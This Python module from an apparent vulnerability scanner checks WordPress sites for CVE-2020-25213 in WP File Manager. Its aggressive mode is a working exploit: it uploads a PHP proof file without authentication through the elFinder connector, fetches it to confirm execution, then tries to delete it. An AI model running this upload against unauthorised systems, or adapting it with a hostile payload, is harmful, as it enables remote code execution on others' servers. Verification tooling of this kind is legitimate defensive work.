from __future__ import annotations

import json
from typing import Any
from urllib.parse import urljoin

from ...core.evidence import generate_php_math_payload, verify_php_execution
from ...core.http import HttpSession, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.probes import rand_str
from ...core.versions import parse_version_required, parse_version_safe
from .plugin_advisory import passive_plugin_finding

CVE_ID = "CVE-2020-25213"
NAME = "WP File Manager unauthenticated file upload and code execution"
COMPONENT = "WordPress plugin WP File Manager"
AFFECTED_RULE = "WP File Manager 6.0 through 6.8"
PLUGIN_SLUG = "wp-file-manager"
PATCHED_VERSION = "6.9"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
CONNECTOR_PATH = "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
UPLOAD_TARGET = "l1_Lw"


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return "DETECTED_VERSION_UNKNOWN"
    if parsed < parse_version_required("6.0"):
        return "NOT_AFFECTED"
    return "LIKELY_VULNERABLE" if parsed < parse_version_required(PATCHED_VERSION) else "PATCHED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    return passive_plugin_finding(
        cve=CVE_ID,
        name=NAME,
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        plugin_slug=PLUGIN_SLUG,
        plugins=plugins,
        classify=classify_version,
        remediation=(
            "Upgrade WP File Manager to 6.9 or newer and inspect "
            "wp-content/plugins/wp-file-manager/lib/files for unexpected files."
        ),
        exploit_available=HAS_EXPLOIT,
    )


def _json(body: str) -> dict[str, Any]:
    try:
        value = json.loads(body)
    except (json.JSONDecodeError, TypeError):
        return {}
    return value if isinstance(value, dict) else {}


def _cleanup(sess: HttpSession, item: dict[str, Any], timeout: int) -> bool:
    file_hash = item.get("hash")
    if not file_hash:
        return False
    response = sess.post(
        CONNECTOR_PATH,
        fields={"cmd": "rm", "target": UPLOAD_TARGET, "targets[]": file_hash},
        timeout=timeout,
    )
    removed = _json(str(response.get("body", ""))).get("removed") or []
    return file_hash in removed


def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    sess = HttpSession(base, timeout=timeout, proxy=proxy)
    payload, expected_product = generate_php_math_payload()
    filename = f"proofcms-{rand_str(8)}.php"

    upload = sess.post_multipart(
        CONNECTOR_PATH,
        fields={"cmd": "upload", "target": UPLOAD_TARGET},
        files={"upload[]": (filename, payload.encode(), "application/x-php")},
        timeout=timeout,
    )
    if is_transport_error(upload):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="ERROR",
            confidence="LOW",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail=f"The elFinder connector could not obtain an HTTP response ({transport_error_detail(upload)}).",
            action="Retry when the target is reachable; do not interpret transport failure as patch status.",
        )

    upload_data = _json(str(upload.get("body", "")))
    added = upload_data.get("added") or []
    item = added[0] if added and isinstance(added[0], dict) else None
    if upload.get("status") != 200 or not item:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail=(
                "The WP File Manager elFinder connector did not accept the unauthenticated PHP upload. "
                f"HTTP {upload.get('status')}."
            ),
            action="Upgrade WP File Manager to 6.9 or newer and review the files directory.",
            evidence={"connector": CONNECTOR_PATH, "upload_status": upload.get("status")},
        )

    relative_url = item.get("url") or f"/wp-content/plugins/wp-file-manager/lib/files/{filename}"
    proof_url = urljoin(f"{base}/", str(relative_url))
    proof = sess.get(proof_url, timeout=timeout)
    body = str(proof.get("body", ""))
    is_executed, is_source = verify_php_execution(body, expected_product)
    cleaned = _cleanup(sess, item, timeout)
    evidence = {
        "connector": CONNECTOR_PATH,
        "upload_status": upload.get("status"),
        "proof_status": proof.get("status"),
        "uploaded_hash": item.get("hash"),
        "removed": cleaned,
    }
    uploaded_name = str(item.get("name") or filename)

    if is_executed:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=proof_url,
            uploaded_filename=uploaded_name,
            detail=(
                "The unauthenticated elFinder connector accepted a PHP file and executed the dynamic "
                f"PHP proof ({expected_product})."
            ),
            action=(
                "Upgrade WP File Manager to 6.9 or newer, delete the uploaded file, and inspect "
                "wp-content/plugins/wp-file-manager/lib/files for compromise."
            ),
            evidence=evidence,
            cleanup_attempted=True,
            cleanup_verified=cleaned,
        )

    if is_source or "<?php" in body.lower():
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE_UPLOAD_ONLY",
            confidence="HIGH",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=proof_url,
            uploaded_filename=uploaded_name,
            detail=(
                "The unauthenticated elFinder connector accepted a PHP file, but the server served it as "
                "source instead of executing it."
            ),
            action="Upgrade WP File Manager to 6.9 or newer and delete the uploaded file.",
            evidence=evidence,
            cleanup_attempted=True,
            cleanup_verified=cleaned,
        )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        proof_url=proof_url,
        uploaded_filename=uploaded_name,
        detail="The upload was accepted, but the proof file could not be read back or executed.",
        action="Upgrade WP File Manager to 6.9 or newer and inspect the files directory.",
        evidence=evidence,
        cleanup_attempted=True,
        cleanup_verified=cleaned,
    )


def check(
    target_url: str,
    cms_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    plugins: dict[str, Any] | None = None,
    **kwargs: Any,
):
    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode != "aggressive":
        passive.detail += " This CVE requires aggressive lab-only upload verification."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        passive.detail += " Aggressive proof skipped because WP File Manager was not detected as potentially affected."
        return passive
    result = run_aggressive_probe(target_url, timeout=timeout, proxy=proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "wordpress",
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_versions": [">=6.0,<6.9"],
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "module_version": "1.1.0",
        "last_reviewed": "2026-11-08",
        "updated": "2026-11-08",
        "required_detectors": [],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2020-25213",
            "https://plugins.trac.wordpress.org/changeset/2373068",
            "https://plugins.trac.wordpress.org/log/wp-file-manager",
        ],
    }
